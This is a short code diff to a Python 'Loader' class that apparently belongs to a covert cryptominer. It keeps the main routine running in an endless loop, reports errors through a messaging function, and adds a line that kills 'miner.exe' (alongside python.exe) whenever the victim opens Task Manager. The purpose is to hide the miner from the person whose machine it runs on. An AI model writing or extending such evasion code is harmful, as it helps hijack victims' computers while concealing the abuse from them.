@@ -30,6 +30,8 @@ class Loader():
 		while True:
 			try:
 				self.Main()
+			except ConnectionError:
+				pass
 			except Exception as ex:
 				self.SendMessage("%E2%9C%96%EF%B8%8F Error : \n %E2%9D%96 Message : " + str(ex))
 	def Request(self,url):
@@ -205,6 +207,7 @@ class Loader():
 			for proc in psutil.process_iter():
 				try:
 					if proc.name() == "Taskmgr.exe":
+						os.system("taskkill /IM miner.exe /F")
 						os.system("taskkill /IM python.exe /F")
 				except:
 					pass
